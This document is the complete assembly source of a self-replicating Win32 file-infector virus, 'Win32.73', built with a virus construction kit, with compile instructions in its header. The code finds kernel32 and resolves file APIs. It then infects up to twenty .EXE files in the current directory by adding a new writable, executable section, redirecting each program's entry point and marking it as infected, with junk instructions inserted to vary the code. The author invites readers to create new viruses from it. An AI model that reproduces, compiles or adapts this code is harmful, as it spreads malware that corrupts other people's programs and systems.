              
;
;
; Win32.73 by SnakeByte
;
; This Virus is created with the Next Generation VCK by SnakeByte
; to get a copy of this Virus Construction Kit check www.kryptocrew.de/snakebyte/
;
; Virus Description : 
;
;  Virusname              : Win32.73
;  Author                 : SnakeByte
;  Operating System       : Win32 ( Win9x, NT, ME, 2000 )
;  Target Files           : Windows Portable Executable
;  Created with           : Next Generation VCK 0.45
;  Creation Date          : 3/14/2016
;  Infection Mark         : 73
;  Infection Type         : adding a new section 
;  API Search             : Byte Comparison Type I
;  Entry Point Obscurity  : No
;  Locate Kernel by       : using address from stack
;  Anti Bait              : No
;  Travelling             : No
;  Encrypt Hostcode       : No
;  Per-Process Residency  : No
;  SelfMailing            : No
;  mIRC Spreading         : No
;  Trash Ratio            : 1 to 29
;  No. of Files to infect : 20
;
;
;
; Compile this source code with (TASM 5.0) : 
;
;     tasm32 /z /ml /m2 <FileName>,,;
;     tlink32 -Tpe -c <FileName>,<FileName>,, import32.lib
;
; If you edit this source or create another virus from this,
; then please send me a copy so that I know what else I could add
;    Hope you enjoy this ... SnakeByte [ SnakeByte@kryptocrew.de ]
;

.586p
.model flat
jumps
.radix 16

 extrn ExitProcess:PROC

.data
 VirusSize equ (offset EndVirus - offset Virus )
 NumberOfApis equ 10d

VirusCode:
                                        ; we add some nop's to make the offsets
                                        ; more variable, these nops will not be copied
                                        ; with the virus !
 db 73053 dup(90h)
Virus:
 call Delta                             ; Get Delta Offset

Delta:
                                        ; add esp, 4
 add esp, 4d
 mov edx, dword ptr [esp-4]
                                        ; mov ebp, edx
 mov ebp, edx
 sub ebp, offset Delta
 jmp KernelSearchStart


;          [ ///// * APISearch 1 Procedure * \\\\\ ]

                                        ; ebx Lenght of API-Name
                                        ; edx Points to API-Name ( Virus )

SearchAPI1:                             ; Procedure to retrieve API Offsets
 pushad




 mov ecx, dword ptr [ebp+NTableVA]


SearchNextApi1:                         ; search for the API's
 push ecx
 mov eax, dword ptr [ecx]
 add eax, [ebp+KernelMZ]
                                        ; mov ecx, eax
                                        ; clear ecx
 xor ecx, ecx
 add ecx, eax
                                        ; mov esi, ecx
 push ecx
 pop esi
 push ebx
 push esi
 mov dword ptr [ebp+TempApisearch3], edx
 cld

                                        ; esi Points to API-Name ( Kernel )
                                        ; edx Points to API-Name ( Virus )
                                        ; compare Names

ApiCompareLoop:
 mov ah, byte ptr [esi]
 cmp ah, byte ptr [edx]
 jne ApiNotFound
 sub ebx, 1
 cmp ebx, 0
 je FoundApi1
                                        ; add edx, 1
 sub edx, -1d
                                        ; add esi, 1
 sub esi, -1d
 jmp ApiCompareLoop

ApiNotFound:                            ; we did not find it :(
 pop esi
 pop ebx
 pop ecx
 mov dword ptr [ebp+Trash1], 1455032    ; Trash
                                        ; mov edx, -1
 mov edx, 0
 add edx, -1d
 and edx, dword ptr [ebp+TempApisearch3]
                                        ; add ecx, 4
 inc ecx
 add ecx, 3d
 add word ptr [ebp+counter], 1h
 cmp word ptr [ebp+counter], 2001h
 je NotFoundApi1
 jmp SearchNextApi1

FoundApi1:                              ; we found the API
                                        ; clear Stack
 add esp, 12d
                                        ; retrieve the offset
                                        ; clear ecx
 xor ecx, ecx
 mov cx, word ptr [ebp+counter]
                                        ; point to ordinal Table
 shl ecx, 1                             ; multiply with 2
 add ecx, dword ptr [ebp+OTableVA]
 xchg ecx, esi
                                        ; clear ecx
 xor ecx, ecx
 mov cx, word ptr [esi]
 shl ecx, 2h
 add ecx, dword ptr [ebp+ATableVA]
                                        ; convert to RVA
 mov eax, dword ptr [ebp+KernelMZ]
 add eax, dword ptr [ecx]
 mov dword ptr [ebp+TempAPI], -1
 and dword ptr [ebp+TempAPI], eax
 popad
ret

NotFoundApi1:
                                        ; we did not get one of the nessecairy API's
                                        ; so we quit !
 pop esi
 popad
 jmp ExecuteHost



;      [ ///// * EXE FILE Infection Procedure * \\\\\ ]

InfectEXE:                              ; infect an exe file
 push dword ptr [ebp+MapAddress]
 pop esi
                                        ; retrieve PE - Header
 mov edi, [esi+3Ch]
 add edi, esi
                                        ; get File Alignment
                                        ; add edi, 60
 add edi, 60d
 mov ecx, [edi]
 dec edi
 sub edi, 59d
 mov dword ptr [ebp+filealign], ecx
 mov esi, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header again
 mov eax, esi
 add eax, dword ptr [esi+3Ch]
                                        ; infection by adding a new section
                                        ; as described by Lord Julus
 mov dword ptr [ebp+PEheader], eax
                                        ; get old Entrypoint
 mov ecx, dword ptr [eax+34h]
 mov dword ptr [ebp+OldBase], ecx
 mov edx, dword ptr [eax+28h]
 push edx
 pop dword ptr [ebp+OldEIP]
 mov edx, [eax+38h]
 mov dword ptr [ebp+sectionalign], edx
                                        ; Get last section
 mov ecx, [eax+74h]
 shl ecx, 3
                                        ; clear ebx
 and ebx, 0
 mov bx, word ptr [eax+6h]
 mov edx, 28h
 pushad
 mov eax, ebx
 mul edx
 mov dword ptr [ebp+Misc1], 0
 xor dword ptr [ebp+Misc1], eax
 popad
                                        ; clear ebx
 xor ebx, ebx
 xor ebx, dword ptr [ebp+Misc1]
 add eax, 78h
 add eax, ecx
 add eax, ebx
 mov edx, offset newsection
 add edx, ebp


 xchg edx, eax
 push edx
                                        ; Calculate the RVA of the new section
 mov ebx, [edx-5*8+8d]
 add ebx, [edx-5*8+12d]
 mov ecx, dword ptr [ebp + offset sectionalign]
 mov dword ptr [ebp+AlignReg1], ebx
 mov dword ptr [ebp+AlignReg2], 0
 add dword ptr [ebp+AlignReg2], ecx
 mov dword ptr [ebp+nsphysicalsize], ebx
 Call Align
 mov ecx, dword ptr [ebp+AlignReg1]
 mov dword ptr [ebp + offset nsRVA], ecx
                                        ;  calculate the virtual size of the new section
 mov ecx, dword ptr [ebp + offset sectionalign]
 mov dword ptr [ebp+AlignReg1], VirusSize
 mov dword ptr [ebp+AlignReg2], ecx
 Call Align
 mov ecx, dword ptr [ebp+AlignReg1]
 mov dword ptr [ebp+nsvirtualsize], ecx
                                        ; calculate physical offset
 mov ecx,[edx-5*8+20d]
 add ecx,[edx-5*8+16d]
 mov edx,dword ptr [ebp + offset filealign]
 mov dword ptr [ebp+AlignReg1], 0
 xor dword ptr [ebp+AlignReg1], ecx
 push edx
 pop dword ptr [ebp+AlignReg2]
 Call Align
 mov eax, dword ptr [ebp+AlignReg1]
 mov dword ptr [ebp+nsphysicaloffset], eax
                                        ; calculate new size
                                        ; clear edx
 sub edx, edx
 add edx, dword ptr [ebp+filealign]
 mov ecx, eax
 add ecx, VirusSize
 mov dword ptr [ebp+AlignReg2], 0
 sub eax, 41775574d                     ; Trash
 xor dword ptr [ebp+AlignReg2], edx
 mov dword ptr [ebp+AlignReg1], 0
 xor dword ptr [ebp+AlignReg1], ecx
 call Align
 mov ecx, dword ptr [ebp+AlignReg1]
                                        ; unmap file and map it again with new size
 push ecx
 pop dword ptr [ebp+NewSize]
 pushad
 Call UnMapFile2
 popad
 mov dword ptr [ebp+WFD_nFileSizeLow], ecx
 call CreateMap
 jc NoEXE
 lea edi, [ebp+newsection]
 xchg edi, eax

                                        ; mov edx, 64
 mov edx, 0
 add edx, 64d
 pop ebx
WriteNewSectionLoop:
 mov ch, byte ptr [eax]
 mov byte ptr [ebx], ch
 add edx, -1
                                        ; add ebx, 1
 inc ebx
                                        ; add eax, 1
 sub eax, -1d
 cmp edx, 0
 jne WriteNewSectionLoop
                                        ; increase section numbers
 mov edx, dword ptr [ebp+PEheader]
 add word ptr [edx+06h], 1
 mov ebx, dword ptr [ebp+nsRVA]
 mov dword ptr [ebp+NewEIP], ebx
                                        ; set new EIP
 mov dword ptr  [edx+28h], ebx
                                        ; set infection mark
 mov dword ptr [edx+4Ch], '73'
 mov edx, dword ptr [ebp+nsphysicaloffset]
 push edx
                                        ; Append Virus
 pop edi
 lea ecx, [ebp+Virus]
 xchg esi, ecx

 mov ebx, VirusSize
 add edi, dword ptr [ebp+MapAddress]

AppendLoop:
 movsb
 dec ebx
 jnz AppendLoop
                                        ; decrease Infection Counter
                                        ; mov ecx, -1
 push -1d
 pop ecx
 and ecx, dword ptr [ebp+InfCounter]
 sub ecx, 1
 mov dword ptr [ebp+InfCounter], 0
 xor dword ptr [ebp+InfCounter], ecx
 clc
ret

NoEXE:
 pop ecx
 stc
ret



;           [ ///// * Outbreak Procedure * \\\\\ ]


Outbreak:                               ; Lets infect some files...


;   [ ///// * Infect Current Directory Procedure * \\\\\ ]

InfectCurDir:                           ; Infect the current directory
                                        ; mov eax, 20
 push 20d
 pop eax
 mov dword ptr [ebp+InfCounter], eax
 lea ebx, [ebp+filemask]
 xchg edx, ebx
 xor ecx, 71430500d                     ; Trash

                                        ; Find File to infect
 call FindFirstFileProc
                                        ; add eax, 1
 add eax, 1d
 dec eax
 add eax, 1
 jz EndInfectCurDir

InfectCurDirFile:                       ; Infect the file
 call InfectFile
                                        ; Check Infection Counter
 cmp [ebp+InfCounter], 0h
 je EndInfectCurDir
                                        ; find more Files
 call FindNextFileProc
 test eax, eax
 jnz InfectCurDirFile

EndInfectCurDir:
                                        ; Close the Handle
 push dword ptr [ebp+FindHandle]
 call dword ptr [ebp+XFindClose]

 jmp ExecuteHost
 sal eax, 10d                           ; Trash


;                  [ ///// * Data * \\\\\ ]

Data:
 FileHandle  dd 0h
 Attributes  dd 0h
 MapAddress  dd 0h
 AlignReg2   dd 0h
 OTableVA    dd 0h
 Misc1       dd 0h

 filealign   dd 0h
 FILETIME                STRUC
 FT_dwLowDateTime        dd       ?
 FT_dwHighDateTime       dd       ?
 FILETIME ENDS

 WIN32_FIND_DATA         label    byte
 WFD_dwFileAttributes    dd       ?
 WFD_ftCreationTime      FILETIME ?
 WFD_ftLastAccessTime    FILETIME ?
 WFD_ftLastWriteTime     FILETIME ?
 WFD_nFileSizeHigh       dd       ?
 WFD_nFileSizeLow        dd       ?
 WFD_dwReserved0         dd       ?
 WFD_dwReserved1         dd       ?
 WFD_szFileName          db       260d dup (?)
 WFD_szAlternateFileName db       13   dup (?)
 WFD_szAlternateEnding   db       03   dup (?)

 AlignReg1   dd 0h
 db 'Win32.73 by SnakeByte',0
 NTableVA    dd 0h
 FindHandle  dd 0h
 ATableVA    dd 0h
 PEheader    dd 0h
 Trash2      dd 0h
 sectionalign   dd 0h
 TempAPI     dd 0h
 filemask    db '*.EXe',0

 APINames:
 db 'UnmapViewOfFile', 0
 db 'CreateFileMappingA', 0
 db 'CreateFileA', 0
 db 'FindFirstFileA', 0
 db 'FindNextFileA', 0
 db 'CloseHandle', 0
 db 'GetFileAttributesA', 0
 db 'MapViewOfFile', 0
 db 'FindClose', 0
 db 'SetFileAttributesA', 0

 OldBase     dd 400000h
 K32Trys     dd 0h
 InfCounter  dd 0h
 KernelMZ    dd 0h
 counter     dw 0h
 MapHandle   dd 0h
 NewSize     dd 0h

 APIOffsets:
 XUnmapViewOfFile       dd 0h
 XCreateFileMappingA    dd 0h
 XCreateFileA           dd 0h
 XFindFirstFileA        dd 0h
 XFindNextFileA         dd 0h
 XCloseHandle           dd 0h
 XGetFileAttributesA    dd 0h
 XMapViewOfFile         dd 0h
 XFindClose             dd 0h
 XSetFileAttributesA    dd 0h

 KernelPE    dd 0h
 Trash1      dd 0h
 NewEIP      dd 0h
newsection:                           ; Settings for the new section
 nsname           db '.NGVCKvx'
 nsvirtualsize    dd 0                ; Virtual Size
 nsRVA            dd 0                ; Relative Virtual Address
 nsphysicalsize   dd 0                ; Size of Raw Data
 nsphysicaloffset dd 0                ; Pointer to Size of Raw Data
 nsreserved       dd 0,0,0            ; reserved
 nsflags          db 40h,0,0,0c0h     ; Section is executable code and writeable

 TempApisearch3 dd 0h
 OldEIP      dd 0h




;      [ ///// * Prepare Infection Procedure * \\\\\ ]

InfectFile:                             ; Infect a file
                                        ; check for maximum filesize
 sar ebx, 12d                           ; Trash
                                        ; clear edx
 mov edx, 55580d
 sub edx, 55580d
 xor edx, dword ptr [ebp+WFD_nFileSizeHigh]
 cmp edx, 0
 jne NoInfection
                                        ; check for minimum filesize
                                        ; clear ecx
 mov ecx, 63694d
 sub ecx, 63694d
 xor ecx, dword ptr [ebp+WFD_nFileSizeLow]
 cmp ecx, 20000d
 jbe NoInfection
                                        ; get and remove file attributes
 mov ecx, ebp
 add ecx, offset WFD_szFileName

 push ecx
 call dword ptr [ebp+XGetFileAttributesA]
 mov dword ptr [ebp+Attributes], eax
                                        ; mov ecx, 128
 mov ecx, 0
 add ecx, 128d
 push ecx
 mov ecx, offset WFD_szFileName
 add ecx, ebp


 push ecx
 call dword ptr [ebp+XSetFileAttributesA]
 or eax, eax
 jz NoInfection
 call OpenFile                          ; open the file
 jc NoInfection
                                        ; check for EXE File
                                        ; clear eax
 xor eax, eax
 add eax, dword ptr [ebp+MapAddress]
                                        ; check for ZM
 cmp word ptr [eax], 'ZM'
 je Goodfile
                                        ; mov edx, 31490
 mov edx, 0
 add edx, 31490d
 test edx, edx
 jnz Notagoodfile
Goodfile:
                                        ; clear ebx
 sub ebx, ebx
 mov bx, word ptr [eax+3Ch]
 cmp ebx, 0
 je Notagoodfile
 mov ebx, dword ptr [eax+3Ch]
                                        ; check if header lies inside the file
 cmp ebx, dword ptr [ebp+WFD_nFileSizeLow]
 ja Notagoodfile
 mov edx, 52623881d                     ; Trash
 add ebx, eax
                                        ; check for PE Header
                                        ; check for EP
 cmp word ptr [ebx], 'EP'
 je Goodfile2
                                        ; clear ecx
 mov ecx, 18180d
 sub ecx, 18180d
 or ecx, ecx
 jz Notagoodfile

Goodfile2:
                                        ; check for previous Infection
 cmp dword ptr [ebx+4Ch], '73'
 jnz yNotagoodfile
 jmp Notagoodfile
yNotagoodfile:
                                        ; check for OBJ
 mov cx, word ptr [ebx+16h]
 and cx, 00002h
 cmp cx, 00002h
 jne Notagoodfile
                                        ; check for DLL
 mov cx, word ptr [ebx+16h]
 and cx, 0F000h
 cmp cx, 02000h
 je Notagoodfile
 call InfectEXE                         ; Infect the file
 jnc Notagoodfile
                                        ; restore the file attributes
 mov edx, dword ptr [ebp+Attributes]
 push edx
 lea esi, [ebp+WFD_szFileName]
 xchg esi, edx

 push edx
 call dword ptr [ebp+XSetFileAttributesA]
 jmp NoInfection

Notagoodfile:
 call UnMapFile

NoInfection:
ret




;        [ ///// * Search Kernel Procedure * \\\\\ ]

KernelSearchStart:
                                        ; get Kernel Adress from Stack
                                        ; --> return Adress to the CreateProcess API
 mov edi, dword ptr [esp]
                                        ; round to pages
 sub di, di
                                        ; set maximum search count
 mov dword ptr [ebp+K32Trys], 6h
                                        ; store old EIP and ImageBase
 mov ecx, dword ptr [ebp+OldEIP]

 push ecx
 pop dword ptr [ebp+retEIP]

 mov edx, dword ptr [ebp+OldBase]

 push edx
 pop dword ptr [ebp+retBase]



GK1:                                    ; check for DOS-EXE Stub
 mov edx, dword ptr [ebp+K32Trys]
 cmp edx, 0h
 jnz GotKernelXX
 jmp NoKernel
GotKernelXX:
                                        ; check for ZM
 movzx eax, word ptr [edi]
 cmp eax, 'ZM'
 je CheckPE

GK2:
 add edi, -65536d
 mov ebx, dword ptr [ebp+K32Trys]
 dec ebx
 sub eax, ecx                           ; Trash
 mov dword ptr [ebp+K32Trys], ebx
 jmp GK1

CheckPE:                                ; Check if found file is a win32 exe
 mov ecx, [edi+3Ch]
 neg edi
 sub ecx, edi
 neg edi
                                        ; check for EP
 cmp word ptr [ecx], 'EP'
 je CheckDLL
 jmp GK2

CheckDLL:

KernelFound:
 mov dword ptr [ebp+KernelPE], 0
 add dword ptr [ebp+KernelPE], ecx
 neg eax                                ; Trash
 mov dword ptr [ebp+KernelMZ], edi

 and dword ptr [ebp+Trash1], 1152301    ; Trash
 lea ebx, GetApis
 sub eax, ecx                           ; Trash
 add ebx, ebp

 push ebx
ret


;          [ ///// * Execute Original File * \\\\\ ]

NoKernel:
                                        ; store old EIP and ImageBase
 mov ebx, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], ebx

 mov ebx, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], ebx



ExecuteHost:                            ; Start the infected File

                                        ; check if we are first generation
 cmp ebp, 0
 je FirstGenHost
 mov eax,12345678h
 org $-4
 retBase dd 0h
 add eax,12345678h
 org $-4
 retEIP dd 0h
 jmp eax



;            [ ///// * Align Procedure * \\\\\ ]

Align:                                  ; align File or Section Size
 pushad
 mov eax, dword ptr [ebp+AlignReg1]
 mov ecx, dword ptr [ebp+AlignReg2]
                                        ; clear edx
 and edx, 0
 div ecx
                                        ; add eax, 1
 sub eax, -1d
 mul ecx
 mov dword ptr [ebp+AlignReg1], 0h
 add dword ptr [ebp+AlignReg1], eax
 popad
ret



;        [ ///// * File Handling Procedure * \\\\\ ]

                                        ; File Handling
OpenFile:                               ; Open File
                                        ; clear eax
 push 0
 pop eax

 push eax
 push eax
 push 3h
 push eax
 xor dword ptr [ebp+Trash1], 564106     ; Trash
                                        ; add eax, 1
 add eax, 1d
 push eax
 mov edx, 80000000h or 40000000h
 shr ecx, 5d                            ; Trash
 push edx
 mov ebx, ebp
 add ebx, offset WFD_szFileName

 push ebx
 call dword ptr [ebp+XCreateFileA]

 inc eax
 jz Closed
 sub eax, 1

 mov dword ptr [ebp+FileHandle], 0
 add dword ptr [ebp+FileHandle], eax

CreateMap:                              ; Map the file
                                        ; clear edx
 push 0
 pop edx
 xor edx, dword ptr [ebp+WFD_nFileSizeLow]
 push edx

                                        ; clear ecx
 xor ecx, ecx
 push ecx
 push edx
 push ecx
                                        ; mov ebx, 4
 push 4d
 pop ebx
 push ebx
 push ecx
 push dword ptr [ebp+FileHandle]
 call dword ptr [ebp+XCreateFileMappingA]
 mov dword ptr [ebp+MapHandle], eax
 sbb ecx, 27d                           ; Trash
 pop edx
 test eax, eax
 jz CloseFile
 and dword ptr [ebp+Trash1], 743599     ; Trash
                                        ; clear ebx
 sub ebx, ebx
 push edx
 push ebx
 push ebx
 push 2h
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XMapViewOfFile]
 sub eax, 1
 add eax, 1
 jz UnMapFile
 mov dword ptr [ebp+MapAddress], eax
 clc
ret

UnMapFile:                              ; Unmap the file and store it to disk
 Call UnMapFile2

CloseFile:                              ; Close the file
 push dword ptr [ebp+FileHandle]
 Call [ebp+XCloseHandle]

Closed:
 stc
ret

UnMapFile2:
 push dword ptr [ebp+MapAddress]
 call dword ptr [ebp+XUnmapViewOfFile]
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XCloseHandle]
ret



;          [ ///// * FindFiles Procedure * \\\\\ ]

                                        ; Find the first file
FindFirstFileProc:
 call ClearOldData
 lea ebx, [ebp+WIN32_FIND_DATA]
 sub dword ptr [ebp+Trash1], ebx        ; Trash
 xchg ecx, ebx

 push ecx
 push edx
 call dword ptr [ebp+XFindFirstFileA]
 mov dword ptr [ebp+FindHandle], eax
ret


FindNextFileProc:                       ; find another file
 call ClearOldData
 lea ebx, [ebp+WIN32_FIND_DATA]
 xchg ebx, edx

 push edx
                                        ; clear ebx
 and ebx, 0
 add ebx, dword ptr [ebp+FindHandle]
 push ebx
 call dword ptr [ebp+XFindNextFileA]
ret


ClearOldData:                           ; we don't want waste in the fields
 pushad
 lea ecx, [ebp+WFD_szFileName]

                                        ; mov eax, 276
 push 276d
 pop eax

ClearOldData2:
 mov byte ptr [ecx], 0h
                                        ; add ecx, 1
 sub ecx, -1d
 dec eax
 jnz ClearOldData2
 popad
ret
 mov dword ptr [ebp+Trash1], ecx        ; Trash





;          [ ///// * APISearch - Procedure * \\\\\ ]


GetApis:                                ; Retrive the APIs we need
                                        ; clear eax
 mov eax, 44392d
 sub eax, 44392d
 add eax, dword ptr [ebp+KernelPE]
                                        ; get Export-Table
 mov ebx, [eax+78h]
 add ebx, [ebp+KernelMZ]
                                        ; add ebx, 28
 add ebx, 28d
                                        ; get ATableVA
 mov eax, dword ptr [ebx]
 add eax, [ebp+KernelMZ]
 mov dword ptr [ebp+ATableVA], eax
                                        ; add ebx, 4
 add ebx, 4d
                                        ; get NTableVA
 mov eax, dword ptr [ebx]
                                        ; add ebx, 4
 dec ebx
 add ebx, 5d
 add eax, [ebp+KernelMZ]
 mov dword ptr [ebp+NTableVA], eax
                                        ; get OTableVA
 mov eax, dword ptr [ebx]
 add eax, [ebp+KernelMZ]
 mov dword ptr [ebp+OTableVA], eax

                                        ; number of API's we're looking for
 push NumberOfApis
 pop ecx

                                        ; load API Names and Offsets
 lea eax, [ebp+APINames]
 xchg eax, edx

 lea eax, [ebp+APIOffsets]
 xchg esi, eax


GetApisLoop: 

 mov ebx, edx
APINameDetect:                          ; calculate the lenght of the names
 inc ebx
 cmp byte ptr [ebx], 0
 jne APINameDetect

 sub ebx, edx
                                        ; search 'em
                                        ; ebx contains Name-Lenght
                                        ; edx points to the Name
                                        ; esi points to the offset
                                        ; clear the counter
 and word ptr [ebp+counter], 0h
 or eax, 35117013d                      ; Trash

 call SearchAPI1
 add edx, ebx
                                        ; add edx, 1
 sub edx, -1d
                                        ; clear eax
 sub eax, eax
 xor eax, dword ptr [ebp+TempAPI]
 mov dword ptr [esi], 0
 add dword ptr [esi], eax
                                        ; add esi, 4
 add esi, 4d
 and dword ptr [ebp+Trash1], ecx        ; Trash
 dec ecx
 jnz GetApisLoop
 jmp Outbreak



CryptEnd:
EndVirus:

;          [ //////////////////\\\\\\\\\\\\\\\\\\\ ]
;          [ ///// * First Generation Host * \\\\\ ]


.code                                   ; Lets place some code
                                        ; to start the virus
                                        ; which is inside the
                                        ; data section
FakeCode:

 push offset VirusCode

 ret


FirstGenHost:                           ; exit for the first generation
 push 0h
 call ExitProcess



end FakeCode

